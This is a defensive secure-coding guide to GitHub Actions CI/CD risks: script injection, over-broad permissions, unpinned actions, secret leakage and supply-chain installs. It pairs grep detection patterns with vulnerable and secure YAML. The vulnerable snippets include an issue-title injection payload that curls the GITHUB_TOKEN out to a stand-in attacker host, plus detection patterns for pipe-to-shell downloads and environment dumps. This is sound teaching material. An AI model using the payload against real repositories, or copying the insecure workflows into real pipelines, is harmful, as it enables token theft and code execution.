# CI/CD Security Patterns

OWASP A03:2025 (Software Supply Chain Failures), A08:2025 (Software and Data Integrity Failures)
Covers GitHub Actions script injection, workflow permissions, unpinned actions, secret handling, and supply chain risks in CI pipelines.

---

## 1. GitHub Actions Script Injection

**CWE:** CWE-78 (OS Command Injection), CWE-94 (Code Injection)
**OWASP:** A03:2025 (Software Supply Chain Failures)
**Severity:** CRITICAL

Any `${{ github.event.* }}` expression in a `run:` block is directly interpolated into the shell script before execution. Attackers control issue titles, PR titles, commit messages, branch names, and comment bodies — all injectable.

### Grep Patterns (search in .github/workflows/*.yml)

```
# Direct injection vectors in run blocks
run:.*\$\{\{\s*github\.event\.issue\.title
run:.*\$\{\{\s*github\.event\.issue\.body
run:.*\$\{\{\s*github\.event\.pull_request\.title
run:.*\$\{\{\s*github\.event\.pull_request\.body
run:.*\$\{\{\s*github\.event\.comment\.body
run:.*\$\{\{\s*github\.event\.review\.body
run:.*\$\{\{\s*github\.event\.head_commit\.message
run:.*\$\{\{\s*github\.event\.commits\[
run:.*\$\{\{\s*github\.event\.discussion\.title
run:.*\$\{\{\s*github\.event\.discussion\.body
run:.*\$\{\{\s*github\.head_ref
run:.*\$\{\{\s*github\.event\.workflow_run

# Broader catch — any event data in run blocks
run:.*\$\{\{\s*github\.event\.

# pull_request_target with checkout (dangerous combo)
on:\s*pull_request_target
```

### Vulnerable Code

**Issue title injection:**
```yaml
# VULNERABLE: Attacker controls issue title
name: Issue Handler
on:
  issues:
    types: [opened]

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Processing issue: ${{ github.event.issue.title }}"
          # Attacker creates issue titled: "; curl https://evil.com/steal?token=$GITHUB_TOKEN #
          # Shell executes: echo "Processing issue: "; curl https://evil.com/steal?token=$GITHUB_TOKEN #"
```

**PR title injection:**
```yaml
# VULNERABLE: PR title in run block
- run: |
    echo "PR: ${{ github.event.pull_request.title }}" >> $GITHUB_STEP_SUMMARY
```

**Comment body injection:**
```yaml
# VULNERABLE: Comment body is fully attacker-controlled
on:
  issue_comment:
    types: [created]
jobs:
  handle:
    runs-on: ubuntu-latest
    steps:
      - run: |
          COMMENT="${{ github.event.comment.body }}"
          # Arbitrary code execution via comment
```

**pull_request_target with PR checkout:**
```yaml
# VULNERABLE: Runs with repo write access but checks out attacker's PR code
on: pull_request_target

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          # Attacker's code runs with write permissions and secrets access
      - run: npm install && npm test
        # Attacker's postinstall script has write access to repo
```

### Secure Code

**Use environment variables instead of inline expressions:**
```yaml
# SECURE: Event data passed via env, not interpolated in shell
- name: Process issue
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  run: |
    echo "Processing issue: $ISSUE_TITLE"
    # Shell treats $ISSUE_TITLE as a string variable, not code
```

**Use an intermediate action for PR title:**
```yaml
# SECURE: Environment variable prevents injection
- name: Log PR info
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    PR_BODY: ${{ github.event.pull_request.body }}
  run: |
    echo "PR Title: $PR_TITLE" >> "$GITHUB_STEP_SUMMARY"
```

**Safe pull_request_target pattern:**
```yaml
# SECURE: Only checkout base repo code, not PR code
on: pull_request_target

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        # Default: checks out base branch (safe)
      - name: Add labels
        uses: actions/labeler@v5  # Only reads file patterns from base
```

---

## 2. Workflow Permissions

**CWE:** CWE-250 (Execution with Unnecessary Privileges), CWE-732 (Incorrect Permission Assignment)
**OWASP:** A08:2025
**Severity:** HIGH

Over-permissioned workflows grant attackers broader access if any step is compromised. The principle of least privilege applies to GITHUB_TOKEN permissions.

### Grep Patterns

```
# Overly broad permissions
permissions:\s*write-all
permissions:\s*read-all

# Missing permissions declaration (defaults to repo settings)
# Look for workflows WITHOUT a top-level 'permissions:' key

# Unnecessary write access
permissions:[\s\S]*?contents:\s*write
permissions:[\s\S]*?packages:\s*write
permissions:[\s\S]*?actions:\s*write
permissions:[\s\S]*?security-events:\s*write
```

### Vulnerable Code

```yaml
# VULNERABLE: All permissions granted
name: CI
on: push
permissions: write-all

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test
      # npm test does NOT need write access to anything
```

```yaml
# VULNERABLE: No permissions declared — inherits repo default (often broad)
name: CI
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test
```

### Secure Code

```yaml
# SECURE: Minimal permissions at top level, expanded per job only if needed
name: CI
on: push

permissions:
  contents: read  # Default: read-only for all jobs

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test

  deploy:
    needs: test
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write      # Only this job needs package write
      id-token: write      # OIDC for cloud deployment
    steps:
      - uses: actions/checkout@v4
      - run: npm run deploy
```

```yaml
# SECURE: Read-only for PR workflows
name: PR Checks
on: pull_request

permissions:
  contents: read
  pull-requests: read

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm run lint
```

---

## 3. Unpinned Actions

**CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
**OWASP:** A08:2025 (Software and Data Integrity Failures)
**Severity:** HIGH

Tags and branches are mutable references. An attacker who compromises a third-party action repo can update `v1` to point to malicious code. Only full commit SHAs are immutable.

### Grep Patterns

```
# Mutable references (vulnerable)
uses:\s*\S+@(main|master|develop|latest)
uses:\s*\S+@v\d+$
uses:\s*\S+@v\d+\.\d+$
uses:\s*\S+@v\d+\.\d+\.\d+$

# Look for SHA-pinned actions (secure pattern)
uses:\s*\S+@[0-9a-f]{40}

# Third-party actions (higher risk than official actions/*)
uses:\s*(?!actions/)\S+@
```

### Vulnerable Code

```yaml
# VULNERABLE: Tag reference — mutable
steps:
  - uses: actions/checkout@v4              # Tag can be moved
  - uses: actions/setup-node@v4            # Tag can be moved
  - uses: third-party/deploy-action@main   # Branch — anyone with push can change
  - uses: other-org/action@v1              # Major version tag — extremely broad
```

### Secure Code

```yaml
# SECURE: Full SHA pinning with version comment
steps:
  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
  - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af  # v4.1.0
  - uses: third-party/deploy-action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2  # v2.3.1

# Use Dependabot or Renovate to keep SHA pins updated:
# .github/dependabot.yml
# updates:
#   - package-ecosystem: "github-actions"
#     directory: "/"
#     schedule:
#       interval: "weekly"
```

---

## 4. Secret Handling in CI

**CWE:** CWE-200 (Exposure of Sensitive Information), CWE-214 (Invocation of Process Using Visible Sensitive Information)
**OWASP:** A02:2025 (Security Misconfiguration), A08:2025 (Software or Data Integrity Failures)
**Severity:** CRITICAL

Secrets printed to logs, passed as CLI arguments, or exposed in environment variables of public steps are retrievable by anyone with log access or process listing capability.

### Grep Patterns

```
# Secrets printed to logs
echo.*\$\{\{\s*secrets\.
echo.*\$SECRET
echo.*\$API_KEY
echo.*\$TOKEN
echo.*\$PASSWORD
run:.*echo.*secret
run:.*echo.*token
run:.*echo.*password
run:.*echo.*key

# Secrets as command-line arguments (visible in ps)
run:.*--password\s*\$\{\{\s*secrets\.
run:.*--token\s*\$\{\{\s*secrets\.
run:.*--api-key\s*\$\{\{\s*secrets\.
run:.*-p\s*\$\{\{\s*secrets\.
curl.*-H.*\$\{\{\s*secrets\.

# Debug mode that dumps environment
run:.*env$
run:.*printenv
run:.*set\s*$
ACTIONS_STEP_DEBUG:\s*true
```

### Vulnerable Code

```yaml
# VULNERABLE: Secret echoed to logs
- run: echo "Token is ${{ secrets.DEPLOY_TOKEN }}"

# VULNERABLE: Secret as CLI argument (visible in process list)
- run: deploy-tool --token ${{ secrets.DEPLOY_TOKEN }} --env production

# VULNERABLE: Debug dumps all env vars including secrets
- run: env | sort

# VULNERABLE: Secret in curl command logged
- run: |
    curl -H "Authorization: Bearer ${{ secrets.API_KEY }}" \
      https://api.example.com/deploy
    # The full curl command appears in the workflow log
```

### Secure Code

```yaml
# SECURE: Secret via environment variable, never echoed
- name: Deploy
  env:
    DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
  run: |
    deploy-tool --token-stdin <<< "$DEPLOY_TOKEN"
    # Or: deploy-tool reads from DEPLOY_TOKEN env var directly

# SECURE: Mask custom secrets
- name: Generate and mask token
  run: |
    TOKEN=$(generate-temp-token)
    echo "::add-mask::$TOKEN"
    echo "TOKEN=$TOKEN" >> $GITHUB_ENV

# SECURE: Use OIDC instead of long-lived secrets
- name: Configure AWS Credentials
  uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502  # v4.0.2
  with:
    role-to-assume: arn:aws:iam::123456789012:role/deploy-role
    aws-region: us-east-1
    # No static AWS keys needed
```

---

## 5. Supply Chain via CI

**CWE:** CWE-506 (Embedded Malicious Code), CWE-494 (Download of Code Without Integrity Check)
**OWASP:** A08:2025
**Severity:** HIGH

CI pipelines run `npm install`, `pip install`, etc., executing arbitrary code from package registries. Postinstall scripts, setup.py, and build scripts all run with the CI environment's permissions and secrets.

### Grep Patterns

```
# Package installation without safety measures
npm install(?!\s+--ignore-scripts)
npm ci(?!\s+--ignore-scripts)
yarn install(?!\s+--ignore-scripts)
pip install(?!\s+--require-hashes)

# Downloading and executing arbitrary scripts
curl.*\|\s*(bash|sh|python|node)
wget.*\|\s*(bash|sh|python|node)
curl.*-o.*&&.*chmod.*\+x
wget.*-O.*&&.*chmod.*\+x

# Self-hosted runners (shared environment risk)
runs-on:\s*(self-hosted|\[self-hosted)

# Missing checksum verification
curl.*-o\s+\S+$
wget.*-O\s+\S+$
```

### Vulnerable Code

```yaml
# VULNERABLE: npm install runs postinstall scripts with full CI access
- run: npm install
  env:
    NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
    AWS_ACCESS_KEY_ID: ${{ secrets.AWS_KEY }}
    # Malicious postinstall script can exfiltrate these secrets

# VULNERABLE: Pipe to shell — no integrity check
- run: curl -fsSL https://get.example.com/install.sh | bash

# VULNERABLE: Self-hosted runner with no isolation
jobs:
  build:
    runs-on: self-hosted
    # Previous builds may have left malicious files
    # Build artifacts can persist between runs
    # Secrets from other repos may be accessible
```

### Secure Code

```yaml
# SECURE: Use npm ci (clean install from lock), consider ignore-scripts
- name: Install dependencies
  run: npm ci --ignore-scripts
  # Then run specific build scripts you trust:
- run: npm run build

# SECURE: Download with checksum verification
- name: Install tool
  run: |
    curl -fsSL -o tool.tar.gz https://releases.example.com/tool-v1.2.3.tar.gz
    echo "abc123def456...expected_sha256  tool.tar.gz" | sha256sum -c -
    tar xzf tool.tar.gz

# SECURE: Ephemeral self-hosted runners
jobs:
  build:
    runs-on: self-hosted
    container:
      image: node:20-slim  # Isolated container per run
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
      - run: npm ci

# SECURE: Pin tool versions and verify
- name: Setup Go
  uses: actions/setup-go@0aaccfd150d50ccaeb58ebd88eb36e1752f9febc  # v5.4.0
  with:
    go-version-file: 'go.mod'  # Version from project, not hardcoded
```

---

## Summary Table

| Pattern | CWE | OWASP | Severity | Key Risk |
|---------|-----|-------|----------|----------|
| Script Injection | CWE-78, CWE-94 | A03 | CRITICAL | RCE via issue/PR/comment content |
| Workflow Permissions | CWE-250, CWE-732 | A08 | HIGH | Excessive token scope if step compromised |
| Unpinned Actions | CWE-829 | A08 | HIGH | Mutable refs allow silent supply chain attack |
| Secret Handling | CWE-200, CWE-214 | A02, A08 | CRITICAL | Secrets in logs/process list/env dumps |
| Supply Chain via CI | CWE-506, CWE-494 | A08 | HIGH | Malicious packages execute in privileged CI env |
